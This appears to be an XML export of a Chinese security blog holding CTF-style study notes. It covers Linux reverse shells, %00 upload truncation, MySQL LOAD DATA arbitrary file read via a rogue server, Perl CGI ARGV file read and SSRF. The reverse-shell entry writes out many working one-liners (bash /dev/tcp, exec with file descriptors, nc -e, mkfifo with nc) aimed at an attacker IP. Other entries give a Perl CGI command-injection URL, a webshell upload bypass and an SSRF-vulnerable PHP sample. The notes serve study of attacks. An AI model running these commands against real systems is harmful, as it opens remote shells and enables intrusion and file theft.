        <category>笔记</category>
      </categories>
  </entry>
  <entry>
    <title>php一些正则绕过</title>
    <url>/2020/05/09/php%E4%B8%80%E4%BA%9B%E6%AD%A3%E5%88%99%E7%BB%95%E8%BF%87/</url>
    <content><![CDATA[<p><a href="https://blog.csdn.net/mochu7777777/article/details/104631142" target="_blank" rel="noopener">关于PHP正则的一些绕过方法</a><br><a href="https://blog.csdn.net/qq_38783875/article/details/85288671" target="_blank" rel="noopener">preg_match函数，正则匹配绕过</a><br><a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html" target="_blank" rel="noopener">PHP利用PCRE回溯次数限制绕过某些安全限制</a></p>]]></content>
      <categories>
        <category>笔记</category>
      </categories>
  </entry>
  <entry>
    <title>Linux反弹shell</title>
    <url>/2020/04/24/Linux%E5%8F%8D%E5%BC%B9shell/</url>
    <content><![CDATA[<p><a href="https://xz.aliyun.com/t/2548" target="_blank" rel="noopener">Linux反弹shell（一）文件描述符与重定向</a><br><a href="https://xz.aliyun.com/t/2549" target="_blank" rel="noopener">Linux 反弹shell（二）反弹shell的本质</a></p><h2 id="文件描述符"><a href="#文件描述符" class="headerlink" title="文件描述符"></a><strong>文件描述符</strong></h2><blockquote>
<p><strong>linux文件描述符</strong>：可以理解为linux跟踪打开文件，而分配的一个数字，这个数字有点类似c语言操作文件时候的句柄，通过句柄就可以实现文件的读写操作。</p>
</blockquote><a id="more"></a>

<p>当Linux启动的时候会默认打开三个文件描述符，分别是：</p>
<p>标准输入standard input 0 （默认设备键盘）<br>标准输出standard output 1（默认设备显示器）<br>错误输出：error output 2（默认设备显示器）</p>
<h3 id="注意："><a href="#注意：" class="headerlink" title="注意："></a><strong>注意：</strong></h3><p>（1）以后再打开文件，描述符可以依次增加<br>（2）一条shell命令，都会继承其父进程的文件描述符，因此所有的shell命令，都会默认有三个文件描述符。</p>
<p><strong>文件所有输入输出都是由该进程所有打开的文件描述符控制的。（Linux一切皆文件，就连键盘显示器设备都是文件，因此他们的输入输出也是由文件描述符控制）</strong></p>
<p>一条命令执行以前先会按照默认的情况进行绑定（也就是上面所说的 0,1,2），如果我们有时候需要让输出不显示在显示器上，而是输出到文件或者其他设备，那我们就需要重定向。</p>
<h2 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a><strong>重定向</strong></h2><p>重定向主要分为两种(其他复杂的都是从这两种衍生而来的)：</p>
<p>（1）输入重定向 &lt; &lt;&lt;<br>（2）输出重定向 &gt; &gt;&gt;</p>
<h3 id="重点："><a href="#重点：" class="headerlink" title="重点："></a><strong>重点：</strong></h3><p>1.bash 在执行一条指令的时候，首先会检查命令中存不存在重定向的符号，如果存在那么首先将文件描述符重定向（之前说过了，输入输出操作都是依赖文件描述符实现的，重定向输入输出本质上就是重定向文件描述符），然后在把重定向去掉，执行指令</p>
<p>2.如果指令中存在多个重定向，那么不要随便改变顺序，因为重定向是从左向右解析的，改变顺序可能会带来完全不同的结果（这一点我们后面会展示）</p>
<p>3.&lt; 是对标准输入 0 重定向 ，&gt; 是对标准输出 1 重定向</p>
<p><strong>4.再强调一下，重定向就是针对文件描述符的操作</strong></p>
<h3 id="1-输入重定向"><a href="#1-输入重定向" class="headerlink" title="1.输入重定向"></a><strong>1.输入重定向</strong></h3><p>格式： [n]&lt; word <strong>（注意[n]与&lt;之间没有空格）</strong></p>
<p>说明：将文件描述符 n 重定向到 word 指代的文件（以只读方式打开）,如果n省略就是0（标准输入）</p>
<p> 解释: 解析器解析到 “&lt;” 以后会先处理重定向，将标准输入重定向到file，之后cat再从标准输入读取指令的时候，由于标准输入已经重定向到了file ，于是cat就从file中读取指令了。(<strong>有没有觉得这个其实就是C语言中的指针或者文件句柄，就是将0这个指针指向了不同的地址，自然有不同的输入</strong>) </p>
<h3 id="2-输出重定向"><a href="#2-输出重定向" class="headerlink" title="2.输出重定向"></a><strong>2.输出重定向</strong></h3><p>格式： [n]&gt; word</p>
<p> 说明： 将文件描述符 n 重定向到word 指代的文件（以写的方式打开），如果n 省略则默认就是 1（标准输出） </p>
<h3 id="3-标准输出与标准错误输出重定向"><a href="#3-标准输出与标准错误输出重定向" class="headerlink" title="3.标准输出与标准错误输出重定向"></a><strong>3.标准输出与标准错误输出重定向</strong></h3><p>格式： &amp;&gt; word &gt;&amp; word</p>
<p>说明:将标准输出与标准错误输出都定向到word代表的文件（以写的方式打开），两种格式意义完全相同，这种格式完全等价于 &gt; word 2&gt;&amp;1 (2&gt;&amp;1 是将标准错误输出复制到标准输出，&amp;是为了区分文件1和文件描述符1的，详细的介绍后面会有)</p>
<h3 id="4-文件描述符的复制"><a href="#4-文件描述符的复制" class="headerlink" title="4.文件描述符的复制"></a><strong>4.文件描述符的复制</strong></h3><p>格式： [n]&lt;&amp;[m] / [n]&gt;&amp;[m] <strong>(这里所有字符之间不要有空格)</strong></p>
<p>说明：</p>
<p>1）这里两个<strong>都是将文件描述符 n 复制到 m</strong> ，两者的区别是，前者是以只读的形式打开，后者是以写的形式打开</p>
<p><strong>因此 0&lt;&amp;1 和 0&gt;&amp;1 是完全等价的（读/写方式打开对其没有任何影响）</strong></p>
<p>2）这里的&amp; 目的是为了区分数字名字的文件和文件描述符，如果没有&amp; 系统会认为是将文件描述符重定向到了一个数字作为文件名的文件，而不是一个文件描述符</p>
<p>这里就可以用上面的例子作为演示，将错误和正确的输出都输入到文件中</p>
<h3 id="重点：-1"><a href="#重点：-1" class="headerlink" title="重点："></a><strong>重点：</strong></h3><p>之前我们说过，重定向符号的顺序不能随便换，因为系统是从左到右执行的，我们下面就举一个例子</p>
<p>(1)cmd &gt; file 2&gt;&amp;1<br>(2)cmd 2&gt;&amp;1 &gt;file</p>
<p>与第一条指令类似的指令在上面我已经介绍过了，我们现在就来看看第二条指令的执行过程</p>
<p><strong>1.首先解析器解析到 2&gt;&amp;1</strong></p>
<p> <strong>2.解析器再向后解析到 “&gt;”</strong> </p>
<h3 id="5-exec-绑定重定向"><a href="#5-exec-绑定重定向" class="headerlink" title="5.exec 绑定重定向"></a><strong>5.exec 绑定重定向</strong></h3><p>格式：exec [n] &lt;/&gt; file/[n]</p>
<p>上面的输入输出重定向将输入和输出绑定文件或者设备以后只对当前的那条指令有效，如果需要接下来的指令都支持的话就需要使用 exec 指令</p>
<h3 id="重点：-2"><a href="#重点：-2" class="headerlink" title="重点："></a><strong>重点：</strong></h3><p>格式： [n]&lt;&gt;word</p>
<p>说明：以读写方式打开word指代的文件，并将n重定向到该文件。如果n不指定的话，默认为标准输入。</p>
<h2 id="什么是反弹shell"><a href="#什么是反弹shell" class="headerlink" title="什么是反弹shell"></a><strong>什么是反弹shell</strong></h2><p> reverse shell，就是控制端监听在某TCP/UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。reverse shell与telnet，ssh等标准shell对应，本质上是网络概念的客户端与服务端的角色反转。 </p>
<h2 id="为什么要反弹shell"><a href="#为什么要反弹shell" class="headerlink" title="为什么要反弹shell"></a><strong>为什么要反弹shell</strong></h2><p>通常用于被控端因防火墙受限、权限不足、端口被占用等情形</p>
<p>假设我们攻击了一台机器，打开了该机器的一个端口，攻击者在自己的机器去连接目标机器（目标ip：目标机器端口），这是比较常规的形式，我们叫做正向连接。远程桌面，web服务，ssh，telnet等等，都是正向连接。那么什么情况下正向连接不太好用了呢？</p>
<p>1.某客户机中了你的网马，但是它在局域网内，你直接连接不了。</p>
<p>2.它的ip会动态改变，你不能持续控制。</p>
<p>3.由于防火墙等限制，对方机器只能发送请求，不能接收请求。</p>
<p>4.对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机，都是未知，所以建立一个服务端，让恶意程序主动连接，才是上策。</p>
<p>那么反弹就很好理解了， 攻击者指定服务端，受害者主机主动连接攻击者的服务端程序，就叫反弹连接。</p>
<h2 id="反弹shell的本质是什么"><a href="#反弹shell的本质是什么" class="headerlink" title="反弹shell的本质是什么"></a><strong>反弹shell的本质是什么</strong></h2><p>我们就以最常见的bash为例：<br>attacker机器上执行：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -lvp 2333</span><br></pre></td></tr></table></figure>

<p>victim 机器上执行：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.146.129/2333 0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<p>可以看到在攻击机上出现了受害者机器的shell</p>
<p>解释一下这条命令具体的含义：</p>
<p><strong>1.bash -i</strong></p>
<p>1）bash 是linux 的一个比较常见的shell,其实linux的shell还有很多，比如 sh、zsh、等，他们之间有着细小差别</p>
<p>2）-i 这个参数表示的是产生交互式的shell</p>
<p><strong>2./dev/tcp/ip/port</strong></p>
<p>/dev/tcp|udp/ip/port 这个文件是特别特殊的，实际上可以将其看成一个设备（Linux下一切皆文件），其实如果你访问这个文件的位置他是不存在的。</p>
<p> 但是如果你在一方监听端口的情况下对这个文件进行读写，就能实现与监听端口的服务器的socket通信 </p>
<p>为了实现交互，我们需要把受害者交互式shell的输出重定向到攻击机上<br>在受害者机器上输入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash -i &gt; /dev/tcp/192.168.146.129/2333</span><br></pre></td></tr></table></figure>

<p> 任何在受害者机器上执行的指令都不会直接回显了，而是在攻击者机器上回显。 </p>
<p>但是这里有一个问题，攻击者没有能够实现对受害者的控制，攻击者执行的命令没法在受害者电脑上执行。</p>
<p>于是我们似乎还需要一条这样的指令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash -i &lt; /dev/tcp/192.168.146.129/2333</span><br></pre></td></tr></table></figure>

<p> 现在我们需要将两条指令结合起来 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash -i &gt; /dev/tcp/192.168.146.129/2333 0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<p> <strong>输入0是由/dev/tcp/192.168.146.129/2333 输入的，也就是攻击机的输入，命令执行的结果1，会输出到/dev/tcp/192.168.156.129/2333上，这就形成了一个回路，实现了我们远程交互式shell 的功能</strong> </p>
<p> <strong>注意：</strong><br>但是这里有一个问题，就是我们在受害者机器上依然能看到我们在攻击者机器中执行的指令 ，如下图所示，我们马上解决 </p>
<p><strong>4. &gt;&amp;、&amp;&gt;</strong></p>
<p>这个符号在我附上链接的那篇文章中也提到了，作用就是混合输出（错误、正确输出都输出到一个地方）</p>
<p>现在我们解决一下前面的问题：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash -i &gt; /dev/tcp/192.168.146.129/2333 0&gt;&amp;1 2&gt;&amp;1</span><br></pre></td></tr></table></figure>

<p>当然我们也可以执行与之完全等价的指令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.146.129/2333 0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<p> bash产生了一个交互环境与本地主机主动发起与目标主机8080端口建立的连接（即TCP 8080 会话连接）相结合，然后在重定向个tcp 8080会话连接，最后将用户键盘输入与用户标准输出相结合再次重定向给一个标准的输出，即得到一个bash 反弹环境。 </p>
<p>至此，我们的反弹shell的经典语句就分析完了，通过这条语句的分析我们能大致的了解反弹shell的本质，以后碰到其他的反弹shell 的语句也能用类似的分析方法区分析，甚至我们也可以自己举一反三创造更加绝妙的反弹shell 的语句**</p>
<h2 id="常见的反弹shell-的语句怎么理解"><a href="#常见的反弹shell-的语句怎么理解" class="headerlink" title="常见的反弹shell 的语句怎么理解"></a><strong>常见的反弹shell 的语句怎么理解</strong></h2><h3 id="1-方法一"><a href="#1-方法一" class="headerlink" title="1.方法一"></a><strong>1.方法一</strong></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash -i&gt;&amp; /dev/tcp/192.168.146.129/2333 0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<p>和</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash -i&gt;&amp; /dev/tcp/192.168.146.129/2333 0&lt;&amp;1</span><br></pre></td></tr></table></figure>

<p>这里的唯一区别就是 0&gt;&amp;1 和 0&lt;&amp;1 ，其实就是打开方式的不同，而对于这个文件描述符来讲并没有什么区别</p>
<h3 id="2-方法二"><a href="#2-方法二" class="headerlink" title="2.方法二"></a><strong>2.方法二</strong></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.146.129/2333 &lt;&amp;2</span><br></pre></td></tr></table></figure>

<p>等价于</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.146.129/2333 0&lt;&amp;2</span><br></pre></td></tr></table></figure>

<h3 id="3-方法三"><a href="#3-方法三" class="headerlink" title="3.方法三"></a><strong>3.方法三</strong></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">exec 5&lt;&gt;/dev/tcp/192.168.146.129/2333;cat &lt;&amp;5|while read line;do $line &gt;&amp;5 2&gt;&amp;1;done</span><br></pre></td></tr></table></figure>

<p><strong>简单的解释一下：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">exec 5&lt;&gt;/dev/tcp/192.168.146.129/2333</span><br></pre></td></tr></table></figure>

<p>这一句将文件描述符5重定向到了 /dev/tcp/192.168.146.129/2333 并且方式是<strong>读写方式</strong>（这种方法在我的前面的文章中也讲到过），于是我们就能通过文件描述符对这个socket连接进行操作了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">command|while read line do .....done</span><br></pre></td></tr></table></figure>

<p>这个是一个非常经典的句子，它的原句是这样的</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">while read line</span><br><span class="line">do</span><br><span class="line">       …</span><br><span class="line">done &lt; file</span><br></pre></td></tr></table></figure>

<p>从文件中依次读取每一行，将其赋值给 line 变量（当然这里变量可以很多，以空格分隔，这里我就举一个变量的例子，如果是一个变量的话，那么一整行都是它的了），之后再在循环中对line进行操作。</p>
<p>而现在我们不是从file 文件中输入了，我们使用管道符对攻击者机器上输入的命令依次执行，并将标准输出和标准错误输出都重定向到了文件描述符5，也就是攻击机上，实现交互式shell的功能。</p>
<p>与之完全类似的还有下面这条指令，读者有兴趣可以自己分析一下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/attackerip/4444; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</span><br></pre></td></tr></table></figure>

<h3 id="4-方法四"><a href="#4-方法四" class="headerlink" title="4.方法四"></a><strong>4.方法四</strong></h3><p>nc 如果安装了正确的版本（存在-e 选项就能直接反弹shell）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -e /bin/sh 192.168.146.129 2333</span><br></pre></td></tr></table></figure>

<p>但是如果是没有-e 选项是不是就不能实现了呢？当然不是，我们可以向下面这样</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.146.129 2333 &gt;/tmp/f</span><br></pre></td></tr></table></figure>

<p><strong>简单的解释：</strong></p>
<p>mkfifo 命令首先创建了一个管道，cat 将管道里面的内容输出传递给/bin/sh，sh会执行管道里的命令并将标准输出和标准错误输出结果通过nc 传到该管道，由此形成了一个回路</p>
<p>类似的命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mknod backpipe p; nc 192.168.146.129 2333 0&lt;backpipe | /bin/bash 1&gt;backpipe 2&gt;backpipe</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>笔记</category>
      </categories>
  </entry>
  <entry>
    <title>00截断</title>
    <url>/2020/04/21/00%E6%88%AA%E6%96%AD/</url>
    <content><![CDATA[<p><a href="https://blog.csdn.net/qq_26090065/article/details/81458937" target="_blank" rel="noopener">00截断原理分析</a> </p><h1 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h1><p>在url中%00表示ascll码中的0 ，而ascii中0作为特殊字符保留，表示字符串结束，所以当url中出现%00时就会认为读取已结束</p><p>比如</p><p><a href="https://mp.csdn.net/upfiles/?filename=test.txt" target="_blank" rel="noopener">https://mp.csdn.net/upfiles/?filename=test.txt</a>                                此时输出的是test.txt</p><a id="more"></a>



<p>加上%00</p>
<p><a href="https://mp.csdn.net/upfiles/?filename=test.php%00.txt" target="_blank" rel="noopener">https://mp.csdn.net/upfiles/?filename=test.php%00.txt</a>                   此时输出的是test.php</p>
<p>就绕过了后缀限制，可以上传webshell啦。</p>
<h1 id="0X00截断"><a href="#0X00截断" class="headerlink" title="0X00截断"></a>0X00截断</h1><p> 然后打开hex,（空格的16进制为0x20）修改16进制内容，把20改成00： </p>
<h1 id="php-00截断"><a href="#php-00截断" class="headerlink" title="php 00截断"></a>php 00截断</h1><blockquote>
<p>php版本要小于5.3.4，5.3.4及以上已经修复该问题</p>
<p>magic_quotes_gpc需要为OFF状态</p>
</blockquote>
<p>include和require一般在网站内部读取文件</p>
<p>file_get_contents一般用于打开一个url或一个文件</p>
<p>file_exists判断文件是否存在</p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
  </entry>
  <entry>
    <title>mysql任意文件读取</title>
    <url>/2020/04/21/mysql%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/</url>
    <content><![CDATA[<p><a href="https://www.anquanke.com/post/id/173039" target="_blank" rel="noopener">从一道ctf题学习mysql任意文件读取漏洞</a><br><a href="http://www.lin2zhen.top/index.php/archives/78/" target="_blank" rel="noopener">mysql任意文件读取漏洞学习</a><br><a href="https://www.vulnspy.com/cn-phpmyadmin-load-data-local-file-read-local-file/" target="_blank" rel="noopener">phpMyAdmin LOAD DATA INFILE 任意文件读取漏洞</a></p><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p> mysql客户端登陆mysql服务端后，客户端执行语句<code>Load data local infile &#39;/etc/passwd&#39; into table proc;</code>，从而可以导致mysql进行本地或远程读取文件。这个原漏洞被爆出在去年<a href="http://aq.mk/index.php/archives/23/" target="_blank" rel="noopener">phpmyadmin任意文件读取漏洞</a>。 </p><a id="more"></a>

<p>如果phpmyadmin开启了如下选项</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$cfg[&apos;AllowArbitraryServer&apos;] = true; //false改为true</span><br></pre></td></tr></table></figure>

<p>则登录时就可以访问远程的服务器。当登陆一个恶意构造的Mysql服务器时，即可利用load data infile读取该服务器上的任意文件。当然前提条件是<code>secure_file_priv</code>参数允许的目录下，且phpmyadmin的用户对该文件有读的权限。</p>
<h1 id="漏洞细节"><a href="#漏洞细节" class="headerlink" title="漏洞细节"></a><strong>漏洞细节</strong></h1><p>LOAD DATA LOCAL导致的任意文件读取是个由来已久的问题，根据前人们的研究：</p>
<p><a href="https://lightless.me/archives/read-mysql-client-file.html" target="_blank" rel="noopener">Read MySQL Client’s File</a><br><a href="http://russiansecurity.expert/2016/04/20/mysql-connect-file-read/" target="_blank" rel="noopener">MySQL connect file read</a><br>我们知道下列的下列情况都存在该问题：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MySQL Client</span><br><span class="line">PHP + mysql/mysqli</span><br><span class="line">PHP + PDO (MYSQL_ATTR_LOCAL_INFILE)</span><br><span class="line">Python + MySQLdb</span><br><span class="line">Python3 + mysqlclient</span><br><span class="line">Java + JDBC Driver</span><br></pre></td></tr></table></figure>

<p>phpMyAdmin 属于典型的 php+mysqli 组合，当 AllowArbitraryServer 开启的情况下（默认关闭），我们可以让phpMyAdmin连接到恶意的MySQL服务器来触发任意文件读取漏洞。</p>
<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a><strong>漏洞利用</strong></h1><p> <strong>EXP:</strong> <a href="https://github.com/Gifts/Rogue-MySql-Server/blob/master/rogue_mysql_server.py" target="_blank" rel="noopener">https://github.com/Gifts/Rogue-MySql-Server/blob/master/rogue_mysql_server.py</a> </p>
<p> <strong>1.</strong> 首先是配置恶意服务器。在db服务器的命令行里修改root/exp/rogue_mysql_server.py文件，设port为3306外的其他端口，这里设为3307，然后在filelist中选择一个要读取的文件。我们这里读取/etc/passwd文件。 </p>
<p> <strong>2.</strong> 运行python rogue_mysql_server.py，启动服务，服务会监听3307端口。 </p>
<p> <strong>3.</strong> 打开phpMyAdmin的登录页面，地址输入db:3307、用户密码随意输，提交登录 </p>
<p> 然后会发现生成一个mysql.log日志，查看日志 </p>
<p> 在日志中我们看到成功读取了passwd文件。 </p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
  </entry>
  <entry>
    <title>perl网页文件</title>
    <url>/2020/03/26/perl%E7%BD%91%E9%A1%B5%E6%96%87%E4%BB%B6/</url>
    <content><![CDATA[<h1 id="perl-CGI"><a href="#perl-CGI" class="headerlink" title="perl CGI"></a>perl CGI</h1><p><a href="https://www.guildhab.top/?p=867" target="_blank" rel="noopener">Web – I-got-id-200 – WriteUp</a></p><ul>
<li><p><strong>要使用 Perl CGI ， 首先要加载 CGI 模块</strong></p>
<p><strong><code>use CGI;</code></strong></p>
</li>
<li><p><strong>CGI模块具有预编程功能 ， 可用于Internet . 但在使用前必须创建CGI的句柄 =&gt; 允许我们访问相关的函数</strong></p>
<p><strong><code>my $cgi = CGI-&gt;new();</code></strong></p>
<p>现在 $cgi 正在加载 CGI 标准函数 , 有关 CGI 标准函数的内容可以参考 <strong><a href="http://www.freeoa.net/development/perl/perl-cgi-fun-intro_2195.html" target="_blank" rel="noopener">Perl CGI 主要函数功能简介</a></strong></p>
</li>
<li><p><strong>本题的环境是一个文件上传 ， 而在上面的链接中有讲到 upload() 这个CGI标准函数</strong></p>
<p>upload() 函数是用于处理文件上传的标准函数 ， 参数为在构造表单时 ` 设置的 name 的值 .</p>
<p>回到之前抓到的数据包 ， name 参数的值为 “ file ” , 文件上传的过程应该是这样的 :</p>
<p><strong><code>if ( $cgi-&gt;upload(&quot;file&quot;) ) { ... }</code></strong></p>
<p>if 语句确定了这是一个文件上传操作 ， <strong>后面的步骤都是在这个 if 语句中进行的</strong> .</p>
</li>
<li><p><strong>获取到参数</strong></p>
<p>在服务器处理之前 ， 需要先检索输入 . 再对它们进行处理 .</p>
<p><strong>在 Perl CGI 标准函数中 ， <code>param()</code> 函数用于获取传入的参数</strong>( 可以接收 GET方法 和 POST方法 传递的参数， 类似 PHP 中的 <code>$REQUEST</code> 全局变量 )</p>
<p>根据之前抓到的数据包 ， 这里的参数应该为 “ file “ ， 所以代码应该是这样的 .</p>
<p><strong><code>my $file= $cgi-&gt;param(&#39;file&#39; );</code></strong></p>
<p><em>下面就可以读取文件内容了</em></p>
</li>
<li><p><strong>读取文件</strong></p>
<p><strong>Perl 使用一种叫做文件句柄类型的变量来操作文件 ， 从文件读取或者写入数据都需要使用到文件句柄 .</strong></p>
<p><strong>文件句柄( file handle )是一个I/O连接的名称 , Perl 中提供了三种文件句柄 : STDIN , STDOUT , STDERR , 分别代表标准输入 ， 标准输出 ， 标准错误输出</strong></p>
<p><strong>这里就要使用到 Perl 中的尖括号运算符( &lt;&gt; )了</strong> , 它有如下的用途</p>
<ol>
<li>如果尖括号中间是文件句柄 ， 尖括号运算符允许读取文件句柄</li>
<li>如果尖括号中间是搜索模式 ， 尖括号运算符能返回与该模式相匹配的的文件列表 ，这被称为一个 glob ， 比如 &lt;*.bat&gt;</li>
<li>如果尖括号内没有任何内容 ， 那么它可以读取命令行上所有的文件内容 ， 如果没有文件名 ， 则可以读取标准输出</li>
</ol>
<p>这里需要使用 <strong>读取文件句柄</strong> 这个功能</p>
</li>
<li><p><strong>输出文件内容</strong></p>
<p>前面读取到了文件句柄 ， 那么如何输出文件的内容呢 ?</p>
<p><strong>这里要用到 Perl 中的特殊变量 <code>$_</code></strong></p>
<p><code>$_</code> 是默认参数的意思，指的是在不指定的情况下，程序处理的上一个变量 .</p>
<p><strong>比如打开一个文本文件 ， 读取每一行 ，在没有指定参数的情况下 ， <code>$_</code> 指向从文件中读取的每一行 .</strong></p>
<p>因此 ， 若想要读取某个文件的内容 ， <strong>可以写一个循环 ， 逐行读取文件的内容</strong></p>
<p><strong><code>while ( &lt;$file&gt; ) { print &quot;$_&quot;; }</code></strong></p>
<p> <strong>Perl 中的 ARGV 全局特殊文件句柄</strong> </p>
<ul>
<li><p>Perl 会将 perl 命令行参数列表放入到数组 @ARGV 中 ， 而默认情况下 ， 这些命令行参数是 Perl 的数据输入源 ， 也就是 <strong>Perl 会以依次将他们当作文件进行读取</strong></p>
</li>
<li><p><strong>param()函数会返回一个列表的文件 ， 但是根据后端代码 ， 只有第一个文件会被放入到 `` 变量中</strong></p>
<p><strong>这里就存在可利用的点!</strong></p>
</li>
<li><p><strong>如果在原来的数据包中新增一个文件上传项 ， 并且删除其 filename 参数 ，</strong> </p>
<blockquote>
<p><strong>在 URL 后添加的路径会被放入到 @ARGV 数组中 ， 配合之前引入的 ARGV 文件句柄 ， 我们就可以读取任意文件 !</strong> </p>
</blockquote>
</li>
</ul>
</li>
</ul><a id="more"></a>

<h1 id="param-函数"><a href="#param-函数" class="headerlink" title="param()函数"></a>param()函数</h1><p> param()函数会返回一个列表的文件但是只有第一个文件会被放入到下面的接收变量中。如果我们传入一个ARGV的文件，那么Perl会将传入的参数作为文件名读出来。对正常的上传文件进行修改,可以达到读取任意文件的目的: </p>
<blockquote>
<p>bp进行抓包，将上传的文件类型及文件内容处复制再粘贴一行，将filename去掉，然后内容填入ARGV ，删除提交文件类型</p>
</blockquote>
<blockquote>
<p>perl文件遇到上传可配合ARGV文件使用造成任意文件读取，然后任意文件读取可利用bash执行一定的命令。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">/cgi-bin/file.pl?/bin/bash%20-c%20ls$&#123;IFS&#125;/|</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>笔记</category>
      </categories>
  </entry>
  <entry>
    <title>ssrf</title>
    <url>/2020/03/25/SSRF/</url>
    <content><![CDATA[<h1 id="SSRF攻击"><a href="#SSRF攻击" class="headerlink" title="SSRF攻击"></a>SSRF攻击</h1><p><a href="https://www.jianshu.com/p/90a34b08a416" target="_blank" rel="noopener">web安全之 – SSRF攻击</a></p><p><a href="https://www.cnblogs.com/20175211lyz/p/11408583.html" target="_blank" rel="noopener">CTF SSRF(服务器端伪造请求)</a></p><p><a href="https://www.cnblogs.com/ophxc/p/12872815.html" target="_blank" rel="noopener">Redis利用，攻击内网（ssrf）)</a></p><h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p><strong>SSRF （Server-side Request Forge, 服务端请求伪造）</strong><br> 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统。</p><a id="more"></a>



<h3 id="漏洞产生"><a href="#漏洞产生" class="headerlink" title="漏洞产生"></a>漏洞产生</h3><p>由于服务端提供了从其他服务器应用获取数据的功能且没有对地址和协议等做过滤和限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。</p>
<p>举个栗子，漏洞代码ssrf.php：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 漏洞代码ssrf.php</span></span><br><span class="line">$ch = curl_init(); </span><br><span class="line">curl_setopt($ch, CURLOPT_URL, $_GET[<span class="string">'url'</span>]); </span><br><span class="line"><span class="comment">#curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);</span></span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>); </span><br><span class="line"><span class="comment">#curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);</span></span><br><span class="line">curl_exec($ch); </span><br><span class="line">curl_close($ch); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>首先curl查看版本以及支持的协议</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">root@localhost <span class="symbol">:curl</span> -V</span><br><span class="line">curl <span class="number">7.54</span>.<span class="number">0</span> (x86_64-apple-darwin17.<span class="number">0</span>) libcurl/<span class="number">7.54</span>.<span class="number">0</span> LibreSSL/<span class="number">2.0</span>.<span class="number">20</span> zlib/<span class="number">1.2</span>.<span class="number">11</span> nghttp2/<span class="number">1.24</span>.<span class="number">0</span></span><br><span class="line"><span class="symbol">Protocols:</span> dict file ftp ftps gopher http https imap imaps ldap ldaps pop3 pop3s rtsp smb smbs smtp smtps telnet tftp</span><br><span class="line"><span class="symbol">Features:</span> AsynchDNS IPv6 Largefile GSS-API Kerberos SPNEGO NTLM NTLM_WB SSL libz HTTP2 UnixSockets HTTPS-proxy</span><br></pre></td></tr></table></figure>

<p>可以看到该版本支持很多协议，其中dict协议、gopher协议、http/s协议以及file协议使用较为广泛。</p>
<p>dict协议探测端口</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line">curl -v <span class="symbol">'http</span>:<span class="comment">//a.com/ssrf.php?url=dict://172.0.0.1:22/info'</span></span><br><span class="line">curl -v <span class="symbol">'http</span>:<span class="comment">//a.com/ssrf.php?url=dict://127.0.0.1:6379/info'</span></span><br></pre></td></tr></table></figure>

<p>利用gopher协议访问redis反弹shell  6379端口</p>
